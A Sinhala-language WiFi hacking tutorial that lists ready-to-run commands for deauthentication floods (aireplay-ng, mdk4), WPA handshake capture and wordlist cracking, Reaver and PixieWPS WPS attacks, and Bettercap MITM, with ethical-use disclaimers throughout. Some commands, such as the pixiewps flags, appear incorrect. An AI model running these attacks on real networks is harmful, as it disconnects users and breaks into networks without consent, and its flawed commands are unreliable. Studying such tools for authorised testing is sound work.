<h3><b>Author Information:</b></h3>

* Author: Secure Horizon [ M.R.C005 ]

* GitHub: https://github.com/chamidu200

* Telegram: http://t.me/hackingword24

* YouTube: https://www.youtube.com/@chamidunimsara20052

------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------

WiFite භාවිතා කරන ආකාරය (Kali Linux)

WiFite යනු WiFi auditing tool එකක් වන අතර, එය automated WiFi attacks සඳහා භාවිතා කරයි.
මෙය Kali Linux සහ Parrot OS වැනි Pentesting OS වල පෙරනිමියෙන් ඇතුළත් වේ.

🔹 WiFite ස්ථාපනය (Installation)
WiFite ඔබේ Kali Linux වල නැති නම්, පහත ආකාරයට ස්ථාපනය කරගන්න:


sudo apt update && sudo apt install wifite -y

🔹 WiFite ක්‍රියාත්මක කිරීම
WiFite root privileges අවශ්‍ය කරන බැවින්, sudo යොදන්න:


sudo wifite

මෙය අවසන් WiFi Attack ක්‍රියාත්මක කරයි.

🔹 WiFi Attack කිරීමේ මූලික පියවර
1️⃣ Monitor Mode Enable කිරීම


sudo airmon-ng start wlan0

👉 wlan0 වෙනුවට ඔබේ WiFi adapter එකේ නම දක්වන්න (iwconfig භාවිතා කරමින් සොයාගත හැක).

2️⃣ WiFi Networks Scan කිරීම


sudo wifite --kill

👉 WiFite WiFi ජාල ව්‍යාප්තියක් සොයා ගනී.

3️⃣ Target Network එකක් තෝරා ගන්න

👉 WiFi list එක ලැබුණු පසු, ඔබට අවශ්‍ය Network එකේ අංකය ඇතුලත් කරන්න.

4️⃣ Attack Type තෝරා ගන්න

WEP Attack
WPA/WPA2 Handshake Capture
WPS Pixie-Dust Attack
Deauthentication Attack (DoS)

🔹 Advanced Commands
✅ වඩාත් වේගවත් атака කිරීමට (Automated Mode):

sudo wifite -i wlan0mon --wps --wpa --wep


✅ Handshake Capture + Aircrack-ng


sudo wifite -i wlan0mon --wpa

👉 Handshake එකක් capture කර password crack කිරීමට "aircrack-ng" භාවිතා කරන්න.

aircrack-ng -w rockyou.txt -b <BSSID> <CAP_FILE>
(rockyou.txt යනු password list එකකි.)




⚠️ වැදගත් අවධානය
🔴 මෙය අධිකරණයෙන් අවසර නොමැතිව වෙනත් ජාලයකට කිරීමට නීතිවිරෝධීයි.
🔴 Ethical Hacking සඳහා පමණක් භාවිතා කරන්න.
🔴 ඔබේම WiFi ජාලයක ආරක්ෂාව පරීක්ෂා කිරීමට පමණක් භාවිතා කරන්න.



© 2025 Secure Horizon [M.R.C005]


*******************************************************************************************************************************************************************






Author Information:

Author: Secure Horizon [ M.R.C005 ]

GitHub: github.com/chamidu200

Telegram: t.me/hackingword24

YouTube: https://www.youtube.com/@chamidunimsara20052

------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------



🔥 Deauthentication Attack (WiFi පරිශීලකයන් විශ්‍රාමික කිරීම)

Deauthentication attack එකක් යනු WiFi ජාලයකට සම්බන්ධ වී ඇති පරිශීලකයන් ජාලයෙන් විසන්ධි කිරීමට යොදාගන්නා ක්‍රමයකි. මෙය WiFi hacking සඳහා බොහෝවිට Penetration Testing මගින් අත්හදා බැලීමේදී භාවිතා වේ.

🛠️ ක්‍රියාවලිය
Step 1: Monitor Mode සක්‍රිය කිරීම

පළමුව, WiFi adapter එක Monitor Mode වලට ගෙන යා යුතුය.

airmon-ng start wlan0

🔹 මෙය WiFi adapter එක wlan0mon ලෙස සක්‍රිය කරයි.

Step 2: ඉලක්කගත ජාලය හඳුනාගැනීම

ඔබට අවශ්‍ය WiFi ජාලය සොයා ගන්න.


airodump-ng wlan0mon

🔹 මෙය අවට WiFi ජාල වල BSSID (MAC Address) සහ Channel Number ලබාදේ.
🔹 BSSID සහ Channel සටහන් කර ගන්න.

Step 3: Deauthentication Attack ආරම්භ කිරීම

ඔබේ ඉලක්කගත ජාලය විසන්ධි කිරීමට පහත විධානය භාවිතා කරන්න.


aireplay-ng --deauth 1000 -a [BSSID] wlan0mon
🔹 [BSSID] වෙනුවට router එකේ MAC address එක දමන්න.
🔹 1000 යනු යැවෙන deauth packets ගණනයි. (එය වැඩි කළ හැක)

💡 Pro Tip:
WiFite මඟින් මෙය කිරීම මන්දගාමී නම්, mdk4 මෘදුකාංගය භාවිතා කරන්න.

mdk4 wlan0mon d -b blacklist.txt

🔹 blacklist.txt එකේ ඉලක්කගත WiFi MAC address එක ඇතුළත් කළ යුතුය.
🔹 මෙය තවත් ප්‍රබල WiFi attack එකක් වන අතර, ජාලය ගණන් වැඩිපුර disconnect කරයි.

⚠️ වැදගත් අවධානය
🔴 මෙය අධිකරණයෙන් අවසර නොමැතිව වෙනත් ජාලයකට කිරීමට නීතිවිරෝධීයි.
🔴 Ethical Hacking සඳහා පමණක් භාවිතා කරන්න.
🔴 ඔබේම WiFi ජාලයක ආරක්ෂාව පරීක්ෂා කිරීමට පමණක් භාවිතා කරන්න.


© 2025 Secure Horizon [M.R.C005]




*****************************************************************************************************************************************************************************


**🔒 Secure Horizon WiFi Hakking මාර්ගෝපදේශය**

---

# **Secure Horizon**

### **කතෘ තොරතුරු:**

- **කතෘ**: Secure Horizon [ M.R.C005 ]
- **GitHub**: [github.com/chamidu200](https://github.com/chamidu200)
- **Telegram**: [t.me/hackingword24](https://t.me/hackingword24)
- **YouTube**: [youtube.com/@chamidunimsara20052](https://www.youtube.com/@chamidunimsara20052)

---

## **WiFi Hakking මෙවලම් සහ ක්‍රමවේද**

### **1. Wifite**

Wifite යනු ස්වයංක්‍රීය වයිෆයි නිරීක්ෂණ මෙවලමකි. මෙය WPA/WPA2 ජාලයට පහසු ක්‍රමයක් හරහා පහරදීම සලසා දෙයි.

#### **ස්ථාපනය:**


sudo apt update && sudo apt install wifite -y


#### **භාවිතය:**


sudo wifite

- ඉලක්කගත ජාලය තෝරා, ස්වයංක්‍රීයව පහරදිය හැක.

### **2. Aircrack-ng**

Aircrack-ng යනු WPA/WPA2 ජාල ආරක්ෂාව විමසා බැලීම සහ ක්‍රැක් කිරීම සඳහා භාවිත කරන බලවත් මෙවලමකි.

#### **ස්ථාපනය:**


sudo apt update && sudo apt install aircrack-ng -y


#### **Handshake අල්ලා ගැනීම:**


sudo airmon-ng start wlan0

        or

sudo airodump-ng wlan0mon


 **BSSID** සහ **Channel** සටහන් කර ගන්න.

sudo airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon


- Handshake අල්ලා ගැනීමට Deauthentication පහරදීමක් කරන්න:


sudo aireplay-ng --deauth 10 -a [BSSID] wlan0mon


- Wordlist එකක් භාවිත කර මුරපදය බිඳ හෙළන්න:


sudo aircrack-ng -w [wordlist] -b [BSSID] capture.cap



### **3. Deauthentication පහරදීම**

WiFi ජාලයෙන් පරිශීලකයින් විසන්ධි කිරීම සඳහා මෙය භාවිත වේ.

#### **Aireplay-ng භාවිතයෙන්:**


sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon


-සියලුම සම්බන්ධිත උපාංග විසන්ධි කරයි.

#### **mdk4 භාවිතයෙන්:**


sudo apt install mdk4 -y

sudo mdk4 wlan0mon d


- WiFi සම්බන්ධතා කඩ කරන පණිවුඩ අධික වශයෙන් යවයි.



### **4. අමතර මෙවලම් සහ උපදෙස්**

#### **Bettercap**

Bettercap යනු උසස් ජාල පහරදීමේ මෙවලමකි. මෙය Man-in-the-Middle (MITM) පහරදීම, HTTPS spoofing, packet sniffing සහ DNS spoofing වැනි ක්‍රියාවලියන්ට භාවිතා කළ හැක.

**ස්ථාපනය:**


sudo apt update && sudo apt install bettercap -y


**භාවිතය:**


sudo bettercap -iface wlan0


#### **Reaver**

Reaver යනු WPS PIN brute-force පහරදීමක් කිරීම සඳහා යෙදෙන මෙවලමකි. මෙය වයිෆයි ජාලයක WPS PIN සොයා WPA/WPA2 මුරපදය බිඳ හෙලිය හැක.

**ස්ථාපනය:**


sudo apt update && sudo apt install reaver -y

**භාවිතය:**


sudo reaver -i wlan0mon -b [BSSID] -vv


#### **PixieWPS**

PixieWPS යනු WPS PIN වල දුර්වලතා පරීක්ෂා කර මුරපදය බිඳ හෙලිය හැකි මෙවලමකි.

**ස්ථාපනය:**


sudo apt update && sudo apt install pixiewps -y


**භාවිතය:**


sudo pixiewps -i wlan0mon -b [BSSID] -f



#### **ආරක්ෂාකාරී භාවිතය:**

⚠️ වැදගත් අවධානය
🔴 මෙය අධිකරණයෙන් අවසර නොමැතිව වෙනත් ජාලයකට කිරීමට නීතිවිරෝධීයි.
🔴 Ethical Hacking සඳහා පමණක් භාවිතා කරන්න.
🔴 ඔබේම WiFi ජාලයක ආරක්ෂාව පරීක්ෂා කිරීමට පමණක් භාවිතා කරන්න.


© 2025 Secure Horizon [M.R.C005]
